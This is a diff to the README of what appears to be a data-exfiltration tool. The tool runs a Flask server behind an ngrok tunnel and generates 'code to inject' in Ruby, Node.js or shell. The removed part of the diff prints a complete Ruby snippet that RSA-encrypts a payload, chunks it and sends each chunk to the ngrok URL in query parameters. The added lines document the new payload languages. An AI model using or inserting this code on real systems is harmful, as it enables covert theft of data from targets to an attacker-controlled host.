@@ -31,35 +31,47 @@ Before running this project, make sure you have the following dependencies insta
    cd secure_exfiltrate
    ```
 
+4. Install Python dependencies:
+
+   ```bash
+   pip install -r requirements.txt
+   ```
+
 ## Usage
 
-To start the main service and set up the ngrok tunnel, run the following command:
+To start the main service and set up the ngrok tunnel:
 
 ```bash
-make start
+make start          # Ruby payload (default)
+make start-node     # Node.js payload
+make start-shell    # Shell script payload
 ```
 
-Example Runtime output (NOTE: the key is randomly generated each time):
+Or run the server directly with `--lang` to choose the exfiltration payload language:
 
 ```bash
-Starting services with concurrently...
+python3 server.py                    # Ruby (default)
+python3 server.py --lang node        # Node.js
+python3 server.py --lang ruby        # Ruby
+python3 server.py --lang shell       # Shell script (requires jq)
+```
+
+Example runtime output with `make start-node` (NOTE: the key is randomly generated each time):
+
+```bash
+Starting services with concurrently (Node.js payload)...
 Ngrok URL: https://f8d5-98-225-53-234.ngrok-free.app
-Ruby Code to inject, for safe transmission:
+Code to inject, for safe transmission:
 =================================
 
-require 'openssl'
-require 'base64'
-require 'net/http'
-require 'uri'
+const crypto = require('crypto');
+const https = require('https');
+...
+```
 
-debug = false
-payload = "hello world " * 1000
-public_key = OpenSSL::PKey::RSA.new("-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvXmwmaNq0EmOUOYh4tOh\nd4VYOdr3CmCRcS3FVyjt473v+KFqQElB3domKHRQt4yAaAly4Yi9m6DbMOTzOL5E\ni8lkY4Y9Lw0n7VFLiqVGQQOObAcdyEQ7G5kCZ6xAk7xoF25kXfSkAPpaejvGZKeR\niX0PVLygfrUT/p9grc3nTJGk1COH7dHX7HTW8eO8XZDsiRFqLy2K6LVw4ZTkfjMT\n24imFKPuXKT0twmrEpxdKmLv2pCH82VHuu+QWRhxD9E46heAvYvaz0SXt1zNK7wc\nz47A/Pzw+MJcc9jjDkYaCqv2gr1K0ZCANL/2j49a1aoXicn1HGdqrTzSBjhsSWiB\nKwIDAQAB\n-----END PUBLIC KEY-----\n")
-chunks = payload.scan(/.{1,#{public_key.n.num_bytes - 42}}/)
-midx = (0...10).map { ('a'..'z').to_a[rand(26)] }.join
-chunks.each_with_index { |chunk, index| encrypted_chunk = public_key.public_encrypt(chunk); encrypted_base64_chunk = Base64.strict_encode64(encrypted_chunk).strip; encoded_chunk = URI.encode_www_form_component(encrypted_base64_chunk); uri = URI.parse("https://f8d5-98-225-53-234.ngrok-free.app/"); uri.query = "n=" + encoded_chunk + "&m=" + midx + "&x=" + index.to_s + "&z=" + chunks.length.to_s; response = Net::HTTP.get_response(uri); puts "==> " + response.code + ": [" + response.body + "]" if debug }
+With `make start` (Ruby, default), the output is Ruby code instead. The server receives and decrypts data the same way regardless of payload language.
 
-=================================
+The Flask server then runs and shows decrypted chunks as they arrive:
 
  * Serving Flask app 'server'
  * Debug mode: off
